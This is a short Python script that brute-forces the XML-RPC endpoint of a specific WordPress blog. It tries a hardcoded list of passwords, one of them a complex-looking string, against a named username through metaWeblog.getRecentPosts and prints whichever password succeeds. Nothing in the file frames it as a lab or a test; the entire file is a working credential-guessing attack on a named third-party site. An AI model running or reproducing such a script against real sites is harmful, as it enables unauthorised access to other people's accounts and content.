import xmlrpc.client

password = ["admin", "password", "acm", "perro", "gato","chimuelo", "w&r)B1*hGOmFg!mdnwnSZsdn", "dracarys", "youknownothing"]

blog = xmlrpc.client.ServerProxy("http://computoafectivo.org/xmlrpc.php")

for contrasena in password:
	
	try:

		resultado = blog.metaWeblog.getRecentPosts("computoafectivo","acarrmo1", contrasena)
		if len(resultado) > 0:
			print("Login correcto: " + contrasena)

	except Exception as e:

		print ("Error: " + contrasena)